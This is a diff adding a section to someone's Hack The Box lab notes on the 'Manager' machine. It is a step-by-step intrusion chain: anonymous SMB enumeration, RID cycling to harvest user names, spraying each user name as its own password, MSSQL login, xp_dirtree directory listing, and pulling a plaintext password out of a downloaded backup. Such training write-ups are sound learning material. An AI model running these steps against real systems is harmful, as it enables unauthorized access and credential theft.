@@ -151,6 +151,47 @@ Mostly https://www.exploit-db.com/exploits/44969
 ```
 
 ## HTB: Manager 16 Mar 2024
+```
+1. smb enumerate: $ smbclient -L \\\\10.129.136.168\\ -N 
+2. perform RID cycling: impacket-lookupsid anonymous@manager.htb -no-pass
+  (It involves sequentially querying Security Identifiers (SIDs) by incrementing the Relative Identifier (RID) portion.)
+3. Get a list of user names in type "SidTypeUser".
+  (others are "SidTypeGroup", "SidTypeAlias", etc)
+4. attempt SMB authentication with passwords same as the usernames.
+   cmd: netexec smb 10.10.11.236 -u usernames.txt -p usernames.txt --no-bruteforce
+  (NetExec is the successor of the no-longer maintained CrackMapExec project)
+  (Found user "operator" with pass "operator".)
+  Test the user "operator" and another user "zhong":
+        [★]$ smbclient -L //10.129.136.168 -U operator
+	Password for [WORKGROUP\operator]: {input operator}
+	
+		Sharename       Type      Comment
+		---------       ----      -------
+		ADMIN$          Disk      Remote Admin
+		C$              Disk      Default share
+		IPC$            IPC       Remote IPC
+		NETLOGON        Disk      Logon server share 
+		SYSVOL          Disk      Logon server share 
+	Reconnecting with SMB1 for workgroup listing.
+	do_connect: Connection to 10.129.136.168 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+	Unable to connect with SMB1 -- no workgroup available
+	
+	[★]$ smbclient -L //10.129.136.168 -U zhong
+	Password for [WORKGROUP\zhong]: {input zhong}
+	session setup failed: NT_STATUS_LOGON_FAILURE
+5. Use the found user/pass pair to access the MSSQL Server.
+   By cmd: impacket-mssqlclient manager/operator:operator@manager.htb -windows-auth
+6. list folders by cmd: xp-dirtree
+   (https://stackoverflow.com/questions/26750054/xp-dirtree-in-sql-server)
+7. list found folder: xp_dirtree \inetpub\wwwroot (find website-backup-27-07-23-old.zip)
+8. download it from http://manager.htb/website-backup-27-07-23-old.zip
+9. unzip and grep "password", find file ".old-conf.xml" has it.
+     (<user>raven@manager.htb</user>
+      <password>R4v3nBe5tD3veloP3r!123</password>)
+10. 
+
+```
+
 
 ## HTB: CozyHosting 02 Mar 2024
 
